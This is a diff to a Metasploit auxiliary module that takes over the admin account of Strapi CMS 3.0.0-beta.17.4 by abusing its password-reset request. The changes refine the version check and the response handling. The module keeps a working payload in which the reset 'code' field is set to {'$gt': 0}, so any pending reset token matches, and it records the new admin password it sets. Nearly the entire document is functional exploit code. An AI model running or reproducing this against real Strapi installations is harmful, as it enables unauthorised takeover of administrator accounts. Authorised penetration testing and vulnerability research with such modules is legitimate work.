@@ -17,6 +17,9 @@ class MetasploitModule < Msf::Auxiliary
           This module abuses the mishandling of a password reset request for
           Strapi CMS version 3.0.0-beta.17.4 to change the password of the admin user.
 
+          An admin account must already have an unused pending password-reset token.
+          This module does not initiate a password-reset request.
+
           Successfully tested against Strapi CMS version 3.0.0-beta.17.4.
         },
         'License' => MSF_LICENSE,
@@ -36,7 +39,7 @@ class MetasploitModule < Msf::Auxiliary
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'Reliability' => [],
-          'SideEffects' => [IOC_IN_LOGS]
+          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]
         }
       )
     )
@@ -47,37 +50,46 @@ class MetasploitModule < Msf::Auxiliary
     ]
   end
 
-  # not used, but figured id include it anyways
-  def check
+  def check_host(_ip)
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'admin', 'init')
     })
-    return Exploit::CheckCode::Unknown('Unable to determine due to a HTTP connection timeout') if res.nil?
+    return Exploit::CheckCode::Unknown('No response from the Strapi initialization endpoint') unless res
+    return Exploit::CheckCode::Unknown("Unexpected HTTP status #{res.code} from the initialization endpoint") unless res.code == 200
+    return Exploit::CheckCode::Unknown('The initialization endpoint returned no JSON data') if res.body.blank?
 
-    begin
-      version = JSON.parse(res.body)
-    rescue JSON::ParserError
-      return Exploit::CheckCode::Safe("Unable to parse json data: #{res.body}")
+    json = res.get_json_document
+    data = json['data'] if json.is_a?(Hash)
+    version_string = data['strapiVersion'] if data.is_a?(Hash)
+    unless version_string.is_a?(String) && version_string.match?(/\A\d+\.\d+\.\d+(?:-beta\.\d+(?:\.\d+)*)?\z/)
+      return Exploit::CheckCode::Unknown('The initialization endpoint did not report a valid Strapi version')
     end
 
-    # Untested if it works with versions lower than 3.0.0-beta.17.4.
-    # builds of 3.0.0-beta.17.3 and lower fail:
-    # npm ERR! gyp: Undefined variable standalone_static_library in binding.gyp while trying to load binding.gyp
-    # however vulners shows 3.0.0 and up to 3.0.0-beta.17.4 are vulnerable
-    version = Rex::Version.new(version.dig('data', 'strapiVersion'))
-    if version.start_with?('3.0.0-beta') && (Rex::Version.new(version.split('-beta.')[1]) <= Rex::Version.new('17.4'))
-      return Exploit::CheckCode::Vulnerable("Vulnerable version detected: #{version.dig('data', 'strapiVersion')}")
+    version = Rex::Version.new(version_string)
+    if version == Rex::Version.new('3.0.0-beta.17.4')
+      return Exploit::CheckCode::Appears("Strapi #{version} is affected; resetting a password requires an unused pending admin reset token")
     end
+    return Exploit::CheckCode::Safe("Strapi #{version} includes the password-reset fix") if version >= Rex::Version.new('3.0.0-beta.17.5')
 
-    Exploit::CheckCode::Safe('Strapi version is not vulnerable to password reset')
+    Exploit::CheckCode::Detected("Strapi #{version} detected; this earlier release has not been verified")
+  rescue ArgumentError => e
+    elog('Failed to parse the reported Strapi version', error: e)
+    Exploit::CheckCode::Unknown('The initialization endpoint reported an invalid Strapi version')
   end
 
   def run
+    password = datastore['NEW_PASSWORD'].to_s.dup.force_encoding(::Encoding::UTF_8)
+    unless password.valid_encoding?
+      print_error('NEW_PASSWORD must contain valid UTF-8 text')
+      return
+    end
+
+    # Request bodies are octets; keep Rex's Content-Length byte-accurate.
     json_post_data = JSON.generate({
       'code' => { '$gt' => 0 },
-      'password' => datastore['NEW_PASSWORD'],
-      'passwordConfirmation' => datastore['NEW_PASSWORD']
-    })
+      'password' => password,
+      'passwordConfirmation' => password
+    }).b
 
     print_status('Resetting admin password...')
     res = send_request_cgi({
@@ -92,22 +104,22 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    begin
-      json_resp = JSON.parse(res.body)
-    rescue JSON::ParserError
-      print_error("Unable to parse json data: #{res.body}")
+    unless res.code == 200
+      print_error('Could not change admin user password; verify that an unused reset token is pending')
       return
     end
 
-    unless res.code == 200
-      print_error('Could not change admin user password, unexpected response code')
+    json_resp = res.body.blank? ? {} : res.get_json_document
+    user = json_resp['user'] if json_resp.is_a?(Hash)
+    unless user.is_a?(Hash) && user['username'].is_a?(String) && user['email'].is_a?(String)
+      print_error('Unexpected password-reset response; no valid user record was returned')
       return
     end
 
     print_good('Password changed successfully!')
-    print_good("User: #{json_resp['user']['username']}")
-    print_good("Email: #{json_resp['user']['email']}")
-    print_good("PASSWORD: #{datastore['NEW_PASSWORD']}")
+    print_good("User: #{user['username']}")
+    print_good("Email: #{user['email']}")
+    print_good("PASSWORD: #{password}")
     credential_data = {
       origin_type: :service,
       module_fullname: fullname,
@@ -115,9 +127,10 @@ class MetasploitModule < Msf::Auxiliary
       service_name: 'strapi cms',
       address: rhost,
       port: rport,
+      protocol: 'tcp',
       private_type: :password,
-      private_data: datastore['NEW_PASSWORD'],
-      username: json_resp['user']['username']
+      private_data: password,
+      username: user['username']
     }
     create_credential(credential_data)
   end
